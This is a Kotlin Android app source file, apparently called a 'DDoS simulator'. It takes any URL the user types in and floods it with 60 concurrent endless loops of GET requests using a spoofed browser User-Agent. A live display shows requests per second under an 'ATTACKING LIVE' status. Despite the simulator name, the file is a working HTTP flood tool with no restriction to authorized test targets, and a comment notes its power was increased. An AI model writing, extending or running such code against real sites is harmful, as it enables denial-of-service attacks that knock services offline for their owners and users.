package com.example.ddossimulator

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicInteger

class MainActivity : AppCompatActivity() {

    private var isAttacking = false
    private val attackJobs = mutableListOf<Job>()
    private val successCount = AtomicInteger(0)
    private val failCount = AtomicInteger(0)
    private var startTime: Long = 0
    private val threadCount = 60 // زيادة القوة قليلاً

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val urlInput = findViewById<EditText>(R.id.urlInput)
        val startBtn = findViewById<Button>(R.id.startBtn)
        val statusText = findViewById<TextView>(R.id.statusText)

        startBtn.setOnClickListener {
            if (!isAttacking) {
                val targetUrl = urlInput.text.toString()
                if (targetUrl.isNotEmpty() && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
                    startMassiveAttack(targetUrl, statusText)
                    startBtn.text = "STOP ATTACK"
                    isAttacking = true
                } else {
                    statusText.text = "Please enter a valid URL"
                }
            } else {
                stopAttack()
                startBtn.text = "START ATTACK"
                isAttacking = false
            }
        }
    }

    private fun startMassiveAttack(targetUrl: String, statusView: TextView) {
        successCount.set(0)
        failCount.set(0)
        startTime = System.currentTimeMillis()
        val scope = CoroutineScope(Dispatchers.IO)
        
        repeat(threadCount) {
            val job = scope.launch {
                while (isActive) {
                    try {
                        val url = URL(targetUrl)
                        val connection = url.openConnection() as HttpURLConnection
                        connection.requestMethod = "GET"
                        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                        connection.connectTimeout = 800
                        connection.readTimeout = 800
                        connection.connect()
                        if (connection.responseCode in 200..299) successCount.incrementAndGet() else failCount.incrementAndGet()
                        connection.disconnect()
                    } catch (e: Exception) {
                        failCount.incrementAndGet()
                    }
                }
            }
            attackJobs.add(job)
        }

        CoroutineScope(Dispatchers.Main).launch {
            while (isAttacking) {
                val elapsedSeconds = (System.currentTimeMillis() - startTime) / 1000.0
                val total = successCount.get() + failCount.get()
                val rps = if (elapsedSeconds > 0) (total / elapsedSeconds).toInt() else 0
                
                statusView.text = """
                    STATUS: ATTACKING LIVE
                    Target: $targetUrl
                    --------------------------
                    Success Requests: ${successCount.get()}
                    Failed Requests: ${failCount.get()}
                    Total Sent: $total
                    Speed: $rps Requests/Sec
                """.trimIndent()
                delay(500)
            }
        }
    }

    private fun stopAttack() {
        attackJobs.forEach { it.cancel() }
        attackJobs.clear()
    }
}
